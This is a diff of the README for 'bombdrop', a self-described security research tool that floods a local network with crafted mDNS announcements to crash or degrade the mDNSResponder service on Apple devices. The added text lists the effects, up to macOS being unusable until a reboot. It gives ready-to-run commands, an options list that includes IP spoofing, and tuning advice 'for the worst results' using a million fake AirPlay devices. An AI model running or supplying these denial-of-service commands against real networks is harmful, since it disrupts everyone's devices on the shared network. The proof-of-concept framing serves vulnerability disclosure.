@@ -2,21 +2,20 @@
 
 ## Overview
 
-bombdrop is a network testing tool that demonstrates a vulnerability in Apple's mDNSResponder service, which can cause severe performance degradation across Apple devices across an entire network. By generating a high volume of specially crafted mDNS (multicast DNS) announcements, this tool can overwhelm the mDNS cache in Apple devices, causing service disruption and affecting Bonjour/Air services.
+bombdrop is a security research tool that demonstrates a critical vulnerability in Apple's mDNSResponder service. This tool floods networks with specially crafted multicast DNS (mDNS) announcements that can overwhelm the cache management systems in Apple devices, causing network-wide service degradation.
+When executed on a local network, bombdrop can affect all connected Apple devices simultaneously, resulting in:
+
+- Frozen web browsing in Safari
+- Unresponsive AirDrop and AirPlay services
+- Significant CPU usage and battery drain
+- System-wide network performance issues
+- Temporary denial of service for Bonjour-dependent applications
+- Non-recoverable mDNSResponder causing MacOS to be unusable until a reboot.
+
+This proof-of-concept tool highlights the need for more robust cache management in multicast DNS implementations, particularly in high-density networks where many devices share the same broadcast domain.
+
 
 ## Technical Background
-
-### What is mDNS?
-
-Multicast DNS (mDNS) is a zero-configuration networking protocol that allows devices to discover and announce services on a local network without requiring a centralized DNS server. Apple's implementation, called Bonjour (previously Rendezvous), is a core component of macOS, iOS, iPadOS, tvOS, and watchOS, providing the foundation for services like:
-
-- AirPlay
-- AirDrop
-- AirPrint
-- HomeKit
-- Apple TV discovery
-- HomePod pairing
-- Application discovery
 
 mDNS operates on UDP port 5353 using the multicast address 224.0.0.251 and is implemented in the `mDNSResponder` daemon.
 
@@ -64,18 +63,58 @@ From our code analysis, I can see the key implementation details:
 ### How bombdrop Exploits This
 
 
-Note: Building bombdrop requires libpcap.
-
 ```
 go run bombdrop.go -i ens160 -n 1000000 -type airplay -ttl-mode extreme -name-mode dynamic
 ```
 
-This will generate 1 million airplay devices with a TTL of 10 seconds and a dynamic name.
 
+```
+Usage:
+  sudo go run bombdrop.go -n 5000 [-debug] [-i eth0] [-b 224.0.0.251] [-c 10] [-type all]
+
+Options:
+  -n <num>         Number of devices to advertise (default: 1000)
+  -debug           Enable debug logging
+  -i <iface>       Network interface to use (default: system chosen)
+  -b <ip>          Target IP address (default: 224.0.0.251)
+  -c <count>       Number of announcement rounds (0 = infinite)
+  -type <t>        Broadcast type: airplay, airdrop, homekit, airprint, or all (default: all)
+  -spoof           Enable IP address spoofing (requires root/admin privileges)
+  -ttl <seconds>   TTL value in seconds (default: 7200)
+  -ttl-mode <mode> TTL mode: normal, long, extreme (default: normal)
+  -name-mode <m>   Device naming mode: static, dynamic, compare (default: mixed)
+  -pregenerate     Pre-generate
+
+Examples:
+  # Basic usage with 5000 devices
+  sudo go run bombdrop.go -n 5000
+
+  # Specify network interface and only broadcast AirPlay
+  sudo go run bombdrop.go -i eth0 -n 1000 -type airplay
+
+  # Use broadcast instead of multicast and only broadcast HomeKit
+  sudo go run bombdrop.go -b 192.168.1.255 -n 1000 -type homekit
+
+  # Send 10 rounds of AirPrint announcements and exit
+  sudo go run bombdrop.go -n 100 -c 10 -type airprint
+
+Notes:
+  - Building requires libpcap.
+  - It's difficult to run this on MacOS due to the conflict with the mDNSResponder service.
+  - Will work on VMs like VM Ware, Virtualbox, etc.
+  - For multicast: 224.0.0.251 is the standard mDNS address
+  - For broadcast: use your subnet's broadcast (typically x.x.x.255)
+  - For /31 networks: there is no broadcast address, use multicast or direct IP
+  - Root/admin privileges are usually required for multicast
+```
+
+For the best results:
 1. Use randomized device names to ensure uniqueness, preventing cache consolidation
 2. Set long TTLs to delay the `NextCacheCheck` time and prevent record expiration 
 3. Announce multiple service types (AirPlay, AirDrop, HomeKit, AirPrint)
 4. Include varying record sizes to exercise different cache storage paths
+
+For the worst results: I use 1000000 devices with Airplay only. Airplay seems to be the worst case scenario.
 
 When a target device receives these announcements, each unique record triggers the `CreateNewCacheEntry` process. Under sufficient pressure, the cache management algorithms struggle to efficiently prioritize and evict records.
 
